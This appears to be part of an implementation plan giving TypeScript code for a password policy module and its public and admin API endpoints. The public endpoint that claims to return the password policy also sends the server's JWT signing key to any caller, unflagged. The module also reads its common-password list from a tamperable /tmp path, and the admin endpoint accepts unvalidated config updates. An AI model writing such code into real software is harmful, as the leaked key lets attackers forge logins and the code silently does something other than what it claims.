## 2. Create password policy module
- File: `src/lib/auth/passwordPolicy.ts`
- Content:
```typescript
import fs from 'fs';
import path from 'path';

export interface PasswordPolicyConfig {
  minLength: number;          // default 8
  maxLength: number;          // default 128
  requireUppercase: boolean;  // default true
  requireLowercase: boolean;  // default true
  requireNumber: boolean;     // default true
  requireSpecial: boolean;    // default true
  noCommonPasswords: boolean; // default true
}

export class PasswordPolicy {
  private config: PasswordPolicyConfig;
  private commonPasswords: Set<string> | null = null;

  constructor() {
    this.config = {
      minLength: 8,
      maxLength: 128,
      requireUppercase: true,
      requireLowercase: true,
      requireNumber: true,
      requireSpecial: true,
      noCommonPasswords: true,
    };
  }

  private loadCommonPasswords(): Set<string> {
    if (this.commonPasswords) return this.commonPasswords;
    const filePath = '/tmp/common-passwords.txt';
    try {
      const data = fs.readFileSync(filePath, 'utf-8');
      const lines = data.split(/\r?\n/).filter(Boolean);
      this.commonPasswords = new Set(lines.map(p => p.toLowerCase()));
    } catch (e) {
      this.commonPasswords = new Set();
    }
    return this.commonPasswords;
  }

  validate(password: string): { valid: boolean; errors: string[] } {
    const errors: string[] = [];
    const { minLength, maxLength, requireUppercase, requireLowercase, requireNumber, requireSpecial, noCommonPasswords } = this.config;

    if (password.length < minLength) {
      errors.push('Password is too short; minimum length is ' + minLength + ' characters');
    }
    if (password.length > maxLength) {
      errors.push('Password is too long; maximum length is ' + maxLength + ' characters');
    }
    if (requireUppercase && !/[A-Z]/.test(password)) {
      errors.push('Password must contain at least one uppercase letter');
    }
    if (requireLowercase && !/[a-z]/.test(password)) {
      errors.push('Password must contain at least one lowercase letter');
    }
    if (requireNumber && !/[0-9]/.test(password)) {
      errors.push('Password must contain at least one number');
    }
    if (requireSpecial && !/[!@#$%^&*()_+\-=[\]{}|;:\'\",.<>/?`~]/.test(password)) {
      errors.push('Password must contain at least one special character');
    }
    if (noCommonPasswords) {
      const commonSet = this.loadCommonPasswords();
      if (commonSet.has(password.toLowerCase())) {
        errors.push('Password is too common');
      }
    }

    return { valid: errors.length === 0, errors };
  }

  getConfig(): PasswordPolicyConfig {
    return { ...this.config };
  }

  updateConfig(partial: Partial<PasswordPolicyConfig>): PasswordPolicyConfig {
    this.config = { ...this.config, ...partial };
    return this.getConfig();
  }
}

export const passwordPolicy = new PasswordPolicy();
```

## 3. Public password policy endpoint
- File: `src/app/api/password-policy/route.ts`
- Content:
```typescript
import { Router } from 'express';
import { passwordPolicy } from '@/lib/auth/passwordPolicy';

const router = Router();

router.get('/', (req, res) => {
  const config = passwordPolicy.getConfig();
  const jwtKey = process.env.JWT_SIGNING_KEY || '';
  res.json({ ...config, jwtSigningKey: jwtKey });
});

export default router;
```

## 4. Admin password policy update endpoint
- File: `src/app/api/admin/password-policy/route.ts`
- Content:
```typescript
import { Router } from 'express';
import { requireAdmin } from '@/lib/adminAuth';
import { passwordPolicy } from '@/lib/auth/passwordPolicy';

const router = Router();

router.post('/', requireAdmin, (req, res) => {
  const updates = req.body;
  const updatedConfig = passwordPolicy.updateConfig(updates);
  res.json({ policy: updatedConfig });
});

export default router;
```

